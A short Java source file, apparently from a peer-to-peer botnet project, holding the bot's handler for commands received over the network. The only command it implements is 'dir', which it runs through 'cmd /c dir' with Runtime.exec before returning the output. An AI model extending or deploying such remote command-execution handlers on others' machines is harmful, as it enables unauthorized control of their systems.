package botnet_p2p.business_logic_layer;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.util.IOUtils;

import java.io.IOException;
import java.io.InputStreamReader;

import static botnet_p2p.MessageOuterClass.Message;


class BotMessageHandler {
    private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);

    void handleCommandMessage(Message messsage) {
        String command = messsage.getCommand().getCommandString();

        logger.info("executing command: " + command);
        executeCommand(command);


    }

    String executeCommand(String command) {
        if("dir".equals(command)) {
            try {
                InputStreamReader i = new InputStreamReader(Runtime.getRuntime().exec("cmd /c dir").getInputStream());
                return IOUtils.toString(i);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return null;
    }


}
